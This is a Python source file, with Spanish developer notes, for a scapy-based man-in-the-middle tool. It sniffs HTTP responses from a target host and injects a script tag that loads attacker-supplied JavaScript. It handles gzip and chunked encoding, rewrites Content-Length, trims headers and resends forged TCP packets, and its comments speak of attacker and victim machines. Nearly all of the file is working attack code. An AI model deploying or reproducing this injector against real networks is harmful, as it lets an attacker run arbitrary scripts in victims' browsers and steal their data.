#Nuevo acercamiento al problema: inyectar en html

#Parece que cuando la longitud de la load es superior a 1434, la longitud del paquete supera los 1514,
#que parece ser el limite de lo que recibe el ordenador victima. ver por que aumenta el tamaño del paquete
#(posiblemente trailer) y probar en otro pc a ver si el tamaño es diferente

#en mi maquina atacante segun wireshark la longitud del paquete que envio es de 1530, y la original 1516.
#justamente es 14 la longitud del trailer. no parece que sea scapy el que este añadiendo el padding de dos octetos,
#ya que las dos situaciones en las que lo hacen tienen colocadas un print que no salta en ningun momento.

#sin embargo scapy me dice que mi paquete mide 1500 mientras que el paquete real mide 1514.
#es posible que estos 14 sean por la capa Ether, ya que mi paquete con capa Ether tambien mide 1514.

#UPDATE: todo era problema del kernel de ubuntu version 4.15

#wikia.com/fandom/ a veces no funciona. no he comprobado los paquetes que llegan, pero parece que en los que
#se envian hay un \r\d\r\d en mitad del load, y no esta mi codigo. probablemente eso haga que no funcione.
#igual el codigo se esta añadiendo mal, o el chunked length esta cambiandose mal


#www.badmintonarmilla.es --> chunked y gzip a la vez
#pensar que hacer en los casos en los que está esto y no se puede descomprimir gzip
#pensar si merece la pena sniffear la transaccion entera

import threading
import gzip
from scapy.all import *

from src import packet_utilities
from src.log import log

class Spoofed_HTTP_Load(bytes):
    ###OLD
    # ~ spoof_load = real_packet.load
        
    # ~ spoof_load = self._increase_length_attribute(spoof_load)
    
    # ~ spoof_load_s = spoof_load.split(b"\r\n\r\n")
    
    # ~ content_encoding = None
    # ~ if b"Content-Encoding: gzip" in spoof_load_s[0]:
        # ~ content_encoding = "gzip"
        # ~ print("DETECTED GZIP ENCODING")
        # ~ try:
            # ~ spoof_load_s[1] = gzip.decompress(spoof_load_s[1])
        # ~ except Exception as err:
            # ~ print("ERROR DECOMPRESSING:", err)
            
    # ~ transfer_encoding = None
    # ~ if b"Transfer-Encoding: chunked" in spoof_load_s[0]:
        # ~ transfer_encoding = "chunked"
        # ~ print("DETECTED CHUNKED ENCODING")
    
    # ~ if transfer_encoding == "chunked":
        # ~ spoof_load_s[1] = self._add_injected_code_to_chunked_load(spoof_load_s[1])
    # ~ else:
        # ~ spoof_load_s[1] = self.injected_code + spoof_load_s[1]

    # ~ if content_encoding == "gzip":
        # ~ spoof_load_s[1] = gzip.compress(spoof_load_s[1])
    
    # ~ spoof_load = b"\r\n\r\n".join(spoof_load_s)

    # ~ spoof_load = self._shorten_load_if_necessary(spoof_load, len(real_packet.load))
    
    
    ###NEW
    def _gzip_action_if_needed(self, load, action):
        if action == "compress": action_f = gzip.compress
        elif action == "decompress": action_f = gzip.decompress
        else: print("ERROR UNKNOWN ACTION", action); return
        
        if "gzip" in self.content_encoding_header:
            try:
                load = action_f(load)
            except Exception as err:
                #Sometimes decompressing fail, because i think we can not decompress a part of
                #a gzip string. However, this doesnt seem a problem. The injected code is
                #attached to the compressed packet load, and then it is compressed.
                print("ERROR WITH GZIP ACTION",action.upper(),":", err)
                #print(load.decode("utf-8", "ignore"))
                print(len(load))
                raise
        
        return load
        
        
    def _add_injected_code(self, load):
        if "chunked" in self.transfer_encoding_header:
            chunk_start = load.find(b"\r\n")
            
            if chunk_start == -1:
                print("CHUNK START NOT FOUND, PROBABLY EMPTY PACKET. THIS SHOULD NOT BE HAPPENING BECAUSE IM NOT HANDLING EMPYT PACKETS ANYMORE.")
                print("Returning", (self.injected_code + load).decode())
                return self.injected_code + load 

            bytes_chunk_length = load[:chunk_start] #chunk length is said before the beggining of the chunk, in the first bytes
            int_chunk_length = int(bytes_chunk_length, 16) #paso la longitud de bytes de base 16 a int de base 10
            new_int_chunk_length = int_chunk_length + len(self.injected_code) #le sumo la longitud del codigo
            new_bytes_chunk_length = hex(new_int_chunk_length)[2:].encode() #paso la longitud de int de base 10 a bytes de base 16. lo del 2 es para quitar el '0x'
            
            #print(type(bytes_chunk_length), type(new_bytes_chunk_length), type(self.injected_code))
            load = load.replace(bytes_chunk_length + b"\r\n", new_bytes_chunk_length + b"\r\n" + self.injected_code)
            # ~ print("CHUNK LENGTH:", int_chunk_length)
            # ~ print("ORIGINAL LOAD:", load)
            # ~ print("LOAD REPLACED:", new_load)
        else:
            load = self.injected_code + load
            
        return load
    
    def _remove_header_attribute_if_needed(self, attr_name, load, length_needed):
        if len(load) > length_needed:
            new_load = load
            attr_all = packet_utilities.get_header_attribute_from_http_load(attr_name, new_load)
            if not attr_all:
                # ~ print("Attribute", attr_name, "not found")
                return load
            
            if len(load) - len(attr_all) > length_needed: #si a pesar de quitarle el atributo sigue siendo muy largo, se lo quito entero
                new_load = new_load.replace(attr_all, b"", 1)
                # ~ print("Attribute", attr_name, "removed completely to save", len(attr_all), "bytes.")
            else: #quito la longitud adecuada para llegar al tamaño
                remove = attr_all[-2-(len(load)-length_needed):-2] #la parte del atributo que quito
                
                
                #si la longitud de lo que vamos a quitar es mayor a la longitud de lo que seria
                #el valor del atributo, en vez de dejar el nombre del atributo a medias (ej 'Expir'),
                #mejor dejar el valor del atributo vacio pero con el nombre (ej 'Expires: \r\n')
                #attrl_all:     Expires: ejemplo\r\n    18   
                #attr_name:     Expires                 7   
                #remove:            res: ejemplo        12
                #final:         Expi\r\n                6
                #should be:     Expires: \r\n           11
                
                if len(remove) >= len(attr_all) - len(attr_name+": \n\r"): 
                    remove = attr_all[len(attr_name + ": \n\r")-2:-2]

                    
                new_load = new_load.replace(remove, b"", 1)
                # ~ print("Attribute", attr_name, "removed partialy to save", len(remove), "bytes. Original attribute length:", len(attr_all))
            return new_load
        else:
            return load


    def _shorten_load_if_needed(self, load, length_needed):
        attributes = ["Date", "Expires", "Last-Modified", "Server", "X-Powered-By", "X-Served-By", "X-Cache", "X-Cache-Hits", "X-Timer"] #not sure about those last X-*
        
        new_load = load
        for attr in attributes:
            new_load = self._remove_header_attribute_if_needed(self, attr, new_load, length_needed)
        
        if len(new_load) > length_needed:
            #This doesnt seem a problem.
            #print("[ERROR] Despite having removed attributes, length was reduced from", len(load), "to", len(new_load), "and not to", length_needed, "(" + str(len(new_load)-length_needed) + " more bytes than intended)")
            log.js.warning("exceeded_len", len_load=len(load), len_new_load = len(new_load), len_needed = length_needed, len_difference = str(len(new_load)-length_needed))
            # ~ print(new_load.decode("utf-8", "ignore"))
        return new_load
                
    
    def _increase_length_header_if_needed(self, load):
        
        first_pos = load.find(b"Content-Length: ")
        if first_pos != -1:
            last_pos = load.find(b"\r\n", first_pos)
            length_all = load[first_pos:last_pos]
            length_n = load[first_pos+16:last_pos]
            #print(length_n)
            new_length = b"Content-Length: " + str(int(length_n)+len(self.injected_code)).encode("utf-8")
            result = load.replace(length_all, new_length, 1)
            return result
        return load
        
        
    def __new__(self, real_load, injected_code):
        spoof_load = real_load
        
        self.injected_code = injected_code
        
        self.content_encoding_header = packet_utilities.get_header_attribute_from_http_load("Content-Encoding", spoof_load).decode()
        self.transfer_encoding_header = packet_utilities.get_header_attribute_from_http_load("Transfer-Encoding", spoof_load).decode()
        self.decompressed = False if self.content_encoding_header else True
            
        spoof_load = spoof_load.split(b"\r\n\r\n")
        
        try:
            spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress")
            self.decompressed = True
        except Exception as err:
            print(self.decompressed)
        
        
        spoof_load[1] = self._add_injected_code(self, spoof_load[1])
        
        
        spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "compress")
        
        spoof_load = b"\r\n\r\n".join(spoof_load)
        
        
        spoof_load = self._shorten_load_if_needed(self, spoof_load, len(real_load))
        spoof_load = self._increase_length_header_if_needed(self, spoof_load)
        
        
        return super().__new__(self, spoof_load)


class JS_Injecter(threading.Thread):
    """holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
    jajajaaaaaaaaaaaaaa"""
    def __init__(self, exit_event, target, file_loc, timeout):
        super().__init__()
        self.exit_event = exit_event
        self.target = target
        self.timeout = timeout
        self.injected_code = b"<script src=\"" + file_loc.encode("utf-8") + b"\"></script>\n"
        #b"<script src=\"" + file_loc.encode("utf-8") + b"\" type=\"text/javascript\"></script>\n"
        #<script src="xxx" type="text/javascript"></script>

        self.handled_packets = []
          
    
    def _add_handled_packet(self, packet):
        data = (packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP"))
        if not data in self.handled_packets: #why the hell did i put this
            self.handled_packets.append(data) 
            
    
    def _has_packet_been_handled(self, packet):
        result = ((packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP")) in self.handled_packets)
        return result
        
    def _send_spoofed_packet(self, real_packet):
        spoof_load = Spoofed_HTTP_Load(real_packet.load, self.injected_code)

        
        spoof_packet = IP(src=real_packet["IP"].src, dst=real_packet["IP"].dst, flags=real_packet["IP"].flags, id=real_packet["IP"].id)/ \
                       TCP(sport=real_packet["TCP"].sport, dport=real_packet["TCP"].dport, seq=real_packet["TCP"].seq, 
                       ack=real_packet["TCP"].ack, flags=real_packet["TCP"].flags, window=real_packet["TCP"].window, options=real_packet["TCP"].options)/ \
                       Raw(load=spoof_load)

        # ~ print("[BEFORE]:")
        # ~ print(real_packet.load.decode("utf-8","ignore"))
        # ~ #real_packet.show()
        # ~ print("\n[AFTER]:")
        # ~ print(spoof_load.decode("utf-8","ignore"))
        # ~ #spoof_packet.show2()
        
        #print("Spoof load length:", len(spoof_load), "Real load length:", len(real_packet.load))
        # ~ if len(spoof_load) > 2000:
            # ~ spoof_packet.show()
        # ~ print(len(spoof_packet["IP"]), len(real_packet["IP"]))
        # ~ print(len(spoof_packet["TCP"]), len(real_packet["TCP"]))
        # ~ print(len(spoof_packet["Raw"]), len(real_packet["Raw"]))
        # print("Spoof packet length:", len(spoof_packet), "Real packet length:", len(real_packet))
        
        spoof_packet["Raw"].remove_payload()
        send(spoof_packet, verbose=0)
        self._add_handled_packet(spoof_packet)
        log.js.info("packet_handled", len_spoof_load = len(spoof_load), len_real_load = len(real_packet.load))
        
    
    def _forward_http_packet(self, packet):
        """Creates a http packet according to the original packet and sends it.
        
        Parameters:
            packet (scapy.packet.Packet): the packet that will be forwarded.
        """
        
        #print("forwarding get packet")
        p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
            TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
            Raw(load=packet.load)
            
        send(p, verbose=0)
        
    def handle_packet(self, packet):
        if not self._has_packet_been_handled(packet):
            self._add_handled_packet(packet)
            
            if packet.load.split(b"\r\n\r\n")[1]:
                #print(packet["TCP"].ack, packet["TCP"].seq, packet["TCP"].chksum, "entered to:", self.handled_packets)
                self._send_spoofed_packet(packet)
            else:
                #Some packets are not HTTP 200 OK.
                #Some packets arrive divided in: 1st packet http header, 2nd packet http body.
                #If there's chunked encoding, there's nothing i can do with the first packet, which is the one I sniff.
                #Even if the packet is not chunked, i think it's better not to mess with those packets.
                log.js.warning("empty_packet")
                self._forward_http_packet(packet)
                
        
    def run(self):
        log.js.info("start", timeout=self.timeout, target=self.target)
        #print("JS Injecter started with target", self.target)
        
        #T not included in lfilter cause its sometimes t and sometimes T
        sniff(filter="tcp and src port 80 and host " + self.target, lfilter= lambda x: x.haslayer("TCP") and x.haslayer("Raw") and b"ype: text/html" in x.load, 
              prn=self.handle_packet, stopperTimeout=3, stopper=self.exit_event.is_set, 
              timeout=self.timeout, store=False)
        
        log.js.info("finish")
        #print("JS Injecter finished.")
